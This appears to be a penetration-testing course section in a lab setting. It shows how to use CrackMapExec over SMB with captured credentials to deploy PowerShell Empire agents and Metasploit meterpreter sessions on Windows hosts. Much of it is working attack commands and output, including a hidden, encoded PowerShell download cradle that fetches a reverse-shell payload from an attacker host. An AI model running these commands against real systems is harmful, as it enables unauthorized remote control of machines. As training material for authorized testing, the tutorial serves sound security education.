# Getting Sessions in a C2 Framework

One thing that can be interesting with CrackMapExec is when we compromise multiple targets, we may want to do more recon or operate using a C2 Framework like Empire or Metasploit. We can use CrackMapExec to execute a payload in each target machine and get an agent into our C2.

This section will discuss two modules that integrate CME with PowerShell Empire and Metasploit framework. We will also explore an alternative if we use a different C2 framework.

***

## Empire

We will start by installing the [Empire framework](https://github.com/BC-SECURITY/Empire) using the [guide](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) provided on their website.

### **Install and Launch Empire Server**

```shell-session
al1abb@htb[/htb]$ git clone --recursive https://github.com/BC-SECURITY/Empire.git -q
al1abb@htb[/htb]$ cd Empire
al1abb@htb[/htb]$ sudo su
al1abb@htb[/htb]# curl -sSL https://install.python-poetry.org | python3 -
al1abb@htb[/htb]# poetry install

<SNIP>
```

Next, we need to run Empire with the username and password we choose. We will use the username `empireadmin` and the password `HackTheBoxCME!`.

### **Running Empire with a Custom Username and Password**

```shell-session
# poetry run python empire.py server --username empireadmin --password HackTheBoxCME!

[*] Loading default config           
[*] Loading bypasses from: /home/plaintext/Empire/empire/server/bypasses/
[*] Loading stagers from: /home/plaintext/Empire/empire/server/stagers/
[*] Loading modules from: /home/plaintext/Empire/empire/server/modules/
[*] Loading listeners from: /home/plaintext/Empire/empire/server/listeners/

<SNIP>
```

Next, we need to edit the CrackMapExec configuration file and the Empire client configuration file to match the username and password we choose.

CrackMapExec configuration file is located by default at `~/.cme/cme.conf`. We need to change the `[Empire]` option to match the username `empireadmin` and password `HackTheBoxCME!`. By default, Empire local server runs at port 1337. It can be modified in the CrackMapExec configuration file.

### CrackMapExec Configuration File

```shell-session
$ cat ~/.cme/cme.conf

[CME]
workspace = default
last_used_db = smb
pwn3d_label = Pwn3d!
audit_mode = 

[BloodHound]
bh_enabled = False
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = neo4j

[Empire]
api_host = 127.0.0.1
api_port = 1337
username = empireadmin
password = HackTheBoxCME!

<SNIP>
```

We need to do the same for the Empire configuration file. The file is located at `empire/client/config.yaml`:

### **Reviewing**

```shell-session
# pwd; echo "";cat empire/client/config.yaml            
                                                                                          
/home/plaintext/Empire

suppress-self-cert-warning: true
auto-copy-stagers: true                    
servers:     
  localhost:             
    host: https://localhost
    port: 1337
    socketport: 5000                        
    username: empireadmin
    password: HackTheBoxCME!
    autoconnect: true  
  other-server:       
    host: https://localhost
    port: 1337
    socketport: 5000                     
    username: empireadmin
    password: HackTheBoxCME!
  another-one:         
    host: https://localhost
    port: 1337                             
    socketport: 5000
    username: empireadmin      
    password: HackTheBoxCME!

<SNIP>
```

Once the configuration files are changed, we must connect to the Empire server with the Empire client.

### **Empire Client Connection**

```shell-session
# poetry run python empire.py client --config empire/client/config.yaml         
                                                     
Loading config from empire/client/config.yaml                       

<SNIP>

========================================================================================
 [Empire] Post-Exploitation Framework
========================================================================================
 [Version] 4.8.1 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
========================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
========================================================================================
 [Documentation] | [Web] https://bc-security.gitbook.io/empire-wiki/
========================================================================================

   _______   ___  ___   ______    __   ______        _______
  |   ____| |   \/   | |   _  \  |  | |   _  \      |   ____|
  |  |__    |  \  /  | |  |_)  | |  | |  |_)  |     |  |__
  |   __|   |  |\/|  | |   ___/  |  | |      /      |   __|
  |  |____  |  |  |  | |  |      |  | |  |\  \----. |  |____
  |_______| |__|  |__| | _|      |__| | _| `._____| |_______|


       409 modules currently loaded

       0 listeners currently active

       0 agents currently active

[*] Connected to localhost
(Empire) > 
```

Now we need to set up the listener, and we will set the host to our IP address and the Port to TCP 8001, where the agent will connect.

### **Empire Setting up IP and Port**

```shell-session
(Empire) > uselistener http                                                                                           
                                                                                                                                        
 Author       @harmj0y                                                                                     
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST                        
              approach.                                                                                    
 Name         HTTP[S]

<SNIP>

(Empire: uselistener/http) > set Host http://10.10.14.33
[*] Set Host to http://10.10.14.33
(Empire: uselistener/http) > set Port 8001
[*] Set Port to 8001
(Empire: uselistener/http) > execute
[+] Listener http successfully started
```

Now we have our listener running, and we can use CrackMapExec to get an agent into Empire with the module `empire_exec`. We need to add the option `LISTENER=http`, which is the listener we set.

### **Using CrackMapExec Module empire\_exec**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M empire_exec -o LISTENER=http 

EMPIRE_E...                                         [+] Successfully generated launcher for listener 'http'
SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
EMPIRE_E... 10.129.204.133  445    MS01             [+] Executed Empire Launcher
```

Once we execute this, we should see a new agent in PowerShell Empire.

{% embed url="https://academy.hackthebox.com/storage/modules/84/empire_listener.jpg" %}

***

## Metasploit

We can do the same on Metasploit Framework using the CrackMapExec module `web_delivery`. We need to configure the `web_delivery` module in the Metasploit Framework and use the provided URL as a parameter to our CrackMapExec module. Let's start `msfconsole` and configure the `web_delivery` handler.

### **Metasploit Configure web\_delivery Handler**

```shell-session
$ msfconsole

<SNIP>

msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.33
SRVHOST => 10.10.14.33
msf6 exploit(multi/script/web_delivery) > set SRVPORT 8443
SRVPORT => 8443
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.14.33
LHOST => 10.10.14.33
msf6 exploit(multi/script/web_delivery) > set LPORT 8002
LPORT => 8002
msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.33:8002 
[*] Using URL: http://10.10.14.33:8443/2S1jAHS
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZ[SNIP]
```

Once the web delivery handler is configured in Metasploit, we can use the `web_delivery` module. It supports two options, `URL` and `PAYLOAD`. We need to set the `URL` option with the URL provided by Metasploit, and the `PAYLOAD` option corresponds to the payload architecture we selected. If we use x64, we can omit this option because x64 is the default value or use `PAYLOAD=64`. If we use a 32 bit payload, we need to set the option `PAYLOAD=32`. Let's see it in action:

### **CrackMapExec web\_delivery Module**

```shell-session
$ crackmapexec smb -M web_delivery --options

[*] web_delivery module options:

        URL  URL for the download cradle
        PAYLOAD  Payload architecture (choices: 64 or 32) Default: 64
```

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M web_delivery -o URL=http://10.10.14.33:8443/2S1jAHS

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WEB_DELI... 10.129.204.133  445    MS01             [+] Executed web-delivery launcher
```

In Metasploit, we should see a new session:

{% embed url="https://academy.hackthebox.com/storage/modules/84/metasploit_session.jpg" %}

***

## Other C2 Frameworks

In case we want to use another C2 Framework, we can accomplish the same result using the options available for Command Execution, as we mention in the section [Command Execution (SMB, WinRM, SSH)](https://academy.hackthebox.com/module/84/section/814). For example, we can create a PowerShell payload, save the payload to a webserver and use the option `-X` to execute a PowerShell command to download and run the payload. We will also need to select the option `--no-output` to send the execution to the background.

Let's use Metasploit as an example, and instead of using the module, let's try to copy the PowerShell script provided in the `web_delivery` payload:

{% embed url="https://academy.hackthebox.com/storage/modules/84/command_execution_c2.jpg" %}
